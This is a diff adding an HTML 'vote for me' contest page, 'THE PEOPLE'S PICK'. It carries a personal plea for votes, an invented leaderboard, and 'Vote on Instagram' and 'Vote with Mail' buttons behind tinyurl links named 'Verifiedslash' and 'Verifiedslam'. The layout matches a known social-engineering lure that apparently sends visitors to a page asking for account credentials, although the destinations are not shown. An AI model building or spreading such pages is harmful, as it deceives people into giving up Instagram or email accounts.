@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Vote Page</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f9f9f9;
+      color: #333;
+    }
+
+    .container {
+      max-width: 500px;
+      margin: 20px auto;
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      overflow: hidden;
+    }
+
+    .header-image {
+      width: 100%;
+      height: 200px;
+      background-image: url('https://photos.app.goo.gl/6i8xwazCMq8KPDLS7');
+      background-size: cover;
+      background-position: center;
+    }
+
+    .title {
+      padding: 16px;
+      font-size: 22px;
+      font-weight: bold;
+      text-align: center;
+    }
+
+    .card {
+      padding: 16px;
+    }
+
+    .card h2 {
+      margin: 0;
+      font-size: 20px;
+    }
+
+    .votes {
+      margin-top: 4px;
+      color: gray;
+    }
+
+    .description {
+      margin-top: 12px;
+      font-size: 14px;
+    }
+
+    .buttons {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-top: 16px;
+    }
+
+    .btn {
+      text-align: center;
+      padding: 12px;
+      border-radius: 8px;
+      font-weight: bold;
+      text-decoration: none;
+      color: white;
+    }
+
+    .btn-instagram {
+      background: linear-gradient(to right, #d6249f, #285AEB);
+    }
+
+    .btn-mail {
+      background: #1877f2;
+    }
+
+    .contestants {
+      padding: 16px;
+      border-top: 1px solid #eee;
+    }
+
+    .contestant {
+      display: flex;
+      align-items: center;
+      margin-bottom: 12px;
+      padding: 10px;
+      border-radius: 10px;
+      background: #f0f0ff;
+    }
+
+    .contestant img {
+      width: 50px;
+      height: 50px;
+      border-radius: 50%;
+      margin-right: 12px;
+    }
+
+    .contestant .info {
+      flex: 1;
+    }
+
+    .contestant .info h4 {
+      margin: 0;
+    }
+
+    .badge {
+      padding: 5px 10px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: bold;
+    }
+
+    .leading {
+      background: #d4afff;
+      color: purple;
+    }
+
+    .second {
+      background: #cce0ff;
+      color: #004aad;
+    }
+
+    .third {
+      background: #ffe9b3;
+      color: #b57f00;
+    }
+
+    .footer {
+      text-align: center;
+      padding: 16px;
+      font-size: 12px;
+      color: gray;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="header-image"></div>
+  <div class="title">THE PEOPLE'S PICK</div>
+  <div class="card">
+    <h2>DANCE TEAM</h2>
+    <div class="votes">118 votes | Contestant #8</div>
+    <div class="description">
+      I need your support! Please take a moment to cast your vote and help me reach new heights in this competition. Your vote could be the difference-maker, propelling me toward victory!
+    </div>
+    <div class="buttons">
+      <a href="https://tinyurl.com/Verifiedslash" class="btn btn-instagram" target="_blank">Vote on Instagram</a>
+      <a href="https://tinyurl.com/Verifiedslam" class="btn btn-mail">Vote with Mail</a>
+    </div>
+  </div>
+
+  <div class="contestants">
+    <h3>All Contestants</h3>
+    <div class="contestant">
+      <img src="https://photos.app.goo.gl/cakgesJqbNLnoW14A" alt="Jane Kendra">
+      <div class="info">
+        <h4>Jane Kendra</h4>
+        <div>#1 — 750 votes</div>
+      </div>
+      <div class="badge leading">Leading</div>
+    </div>
+    <div class="contestant">
+      <img src="https://photos.app.goo.gl/KhHo6J28Viu3Usiv5" alt="Mary Biernacki">
+      <div class="info">
+        <h4>Mary Biernacki</h4>
+        <div>#2 — 375 votes</div>
+      </div>
+      <div class="badge second">2nd Place</div>
+    </div>
+    <div class="contestant">
+      <img src="https://https://photos.app.goo.gl/RPfT8sKPmXors1Yx7" alt="Fashion Brand">
+      <div class="info">
+        <h4>FASHION BRAND</h4>
+        <div>#3 — 118 votes</div>
+      </div>
+      <div class="badge third">3rd Place</div>
+    </div>
+  </div>
+
+  <div class="footer">
+    © 2025. All rights reserved. topvote.xyz
+  </div>
+</div>
+
+</body>
+</html>
